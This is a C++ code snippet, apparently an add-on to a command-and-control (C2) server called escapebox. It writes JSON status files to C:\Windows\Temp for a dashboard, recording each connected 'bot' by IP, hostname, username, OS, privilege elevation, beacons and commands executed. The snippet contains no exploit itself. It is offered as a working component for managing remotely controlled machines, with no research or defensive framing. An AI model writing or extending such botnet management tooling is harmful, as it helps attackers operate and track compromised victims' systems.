// C2 Status Writer - Add this to escapebox.cpp to enable web dashboard
#include <fstream>
#include <sstream>
#include <iomanip>

// Add this function to your escapebox.cpp
void writeC2StatusToFile() {
    // Create directories if they don't exist
    CreateDirectoryA("C:\\Windows\\Temp\\C2_Bots", NULL);
    
    // Write main status file
    std::ofstream statusFile("C:\\Windows\\Temp\\C2_Status.json");
    if (statusFile.is_open()) {
        statusFile << "{\n";
        statusFile << "  \"server_status\": \"active\",\n";
        statusFile << "  \"total_bots\": " << clients.size() << ",\n";
        statusFile << "  \"active_bots\": " << activeConnections << ",\n";
        statusFile << "  \"total_commands\": " << totalCommandsSent << ",\n";
        statusFile << "  \"server_start_time\": \"" << serverStartTime << "\",\n";
        statusFile << "  \"last_update\": \"" << std::time(nullptr) << "\"\n";
        statusFile << "}\n";
        statusFile.close();
    }
    
    // Write individual bot files
    for (const auto& [clientId, client] : clients) {
        std::string safeId = clientId;
        // Replace : with _ for filename
        size_t pos = safeId.find(':');
        if (pos != std::string::npos) {
            safeId = safeId.substr(0, pos);
        }
        
        std::string botFile = "C:\\Windows\\Temp\\C2_Bots\\" + safeId + ".json";
        std::ofstream bot(botFile);
        if (bot.is_open()) {
            bot << "{\n";
            bot << "  \"id\": \"" << safeId << "\",\n";
            bot << "  \"ip\": \"" << client.ip << "\",\n";
            bot << "  \"hostname\": \"" << client.hostname << "\",\n";
            bot << "  \"username\": \"" << client.username << "\",\n";
            bot << "  \"os\": \"" << client.os << "\",\n";
            bot << "  \"status\": \"" << (client.connected ? "active" : "offline") << "\",\n";
            bot << "  \"elevated\": " << (client.isElevated ? "true" : "false") << ",\n";
            bot << "  \"last_seen\": " << client.lastSeen << ",\n";
            bot << "  \"connect_time\": " << client.connectTime << ",\n";
            bot << "  \"commands_executed\": " << client.commandCount << ",\n";
            bot << "  \"beacon_count\": " << client.beaconCount << "\n";
            bot << "}\n";
            bot.close();
        }
    }
}

// Add this to the handleClient function after processing commands:
// writeC2StatusToFile();

// Also add these variables at the top of your escapebox.cpp if not present:
// int totalCommandsSent = 0;
// std::string serverStartTime = std::to_string(std::time(nullptr));
